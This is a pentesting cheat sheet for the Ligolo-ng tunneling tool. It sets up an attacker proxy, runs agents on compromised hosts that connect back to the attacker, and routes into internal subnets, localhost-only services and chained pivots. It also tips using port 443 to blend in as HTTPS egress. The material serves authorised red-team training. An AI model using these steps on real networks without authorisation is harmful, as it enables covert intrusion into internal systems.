# Ligolo-ng

> Tunneling tool that routes traffic through a **TUN interface** (VPN-like, no proxychains needed). The agent runs on the target **without admin**; the proxy (attacker side) needs rights to create a TUN interface.

## Tips

- [Docs](https://docs.ligolo.ng)
- [ligolo-ng (releases)](https://github.com/nicocha30/ligolo-ng/releases)

## Setup (attacker / proxy)

```bash
# Create and bring up the TUN interface (once)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# Start the proxy (listens for the agent)
./proxy -selfcert -laddr 0.0.0.0:$LIGOLO_PORT                   # self-signed, quick; agent needs -ignore-cert
./proxy -certfile cert.pem -keyfile key.pem -laddr 0.0.0.0:443  # real/LE cert on 443: looks like plain HTTPS egress
```

## Agent (target)

::: code-group

```powershell [Windows]
.\agent.exe -connect $LIGOLO_IP:$LIGOLO_PORT -ignore-cert
```

```bash [Linux]
./agent -connect $LIGOLO_IP:$LIGOLO_PORT -ignore-cert
```

:::

Useful agent flags for a real engagement:

```bash
./agent -connect $LIGOLO_IP:443 -retry              # auto-reconnect if the link drops (survives flaky shells)
./agent -connect $LIGOLO_IP:443 -proxy $PROXY_URL   # egress through a corporate HTTP/SOCKS proxy
```

## Start the tunnel (proxy session)

```bash
ligolo-ng » session   # select the connected agent
ligolo-ng » start     # start the tunnel
```

```bash
# On the attacker: route the target subnet through the TUN interface
sudo ip route add $SUBNET_TARGET/$NETMASK_TARGET dev ligolo
```

The target's internal subnet is now reachable directly.

## Reverse port forward (target -> attacker)

Expose a local attacker service to the target's network via the agent, from the proxy session:

```bash
ligolo-ng » listener_add --addr 0.0.0.0:$RPORT --to 127.0.0.1:$LPORT --tcp
```

## Reach the agent's own loopback (240.0.0.1)

Services bound to `127.0.0.1` on the compromised host aren't reachable through the subnet route. Ligolo maps the agent's localhost to the special `240.0.0.1` address:

```bash
# On the attacker, route the magic IP through the tunnel
sudo ip route add 240.0.0.1/32 dev ligolo
```

```bash
# Now the agent's own 127.0.0.1:$RPORT is reachable at 240.0.0.1:$RPORT
curl http://240.0.0.1:$RPORT        # e.g. a DB or admin panel bound to localhost only
```

## Double pivot (chained agents)

When a second host is only reachable *from* the first pivot (it can't egress to you directly), relay the ligolo port through the first agent, then run a second tunnel on its own interface.

```bash
# 1. On the FIRST agent's session, relay the proxy's listening port into the internal network
ligolo-ng » session                                   # select agent1
ligolo-ng » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

```bash
# 2. The SECOND host connects to agent1's internal IP (relayed back to your proxy)
./agent -connect $AGENT1_INTERNAL_IP:11601 -ignore-cert -retry
```

```bash
# 3. Give the second session its own interface and route the deeper subnet through it
sudo ip tuntap add user $USER mode tun ligolo2
sudo ip link set ligolo2 up

ligolo-ng » session                                   # select agent2
ligolo-ng » start --tun ligolo2
sudo ip route add $SUBNET_TARGET2/$NETMASK_TARGET2 dev ligolo2
```

## Multiple agents / tunnels

Each concurrent tunnel needs its own TUN interface. Create one per agent and bind the session to it with `start --tun <iface>`, then add that session's routes on the matching interface. Routing stays clean because each subnet lives on a distinct device, no proxychains juggling.
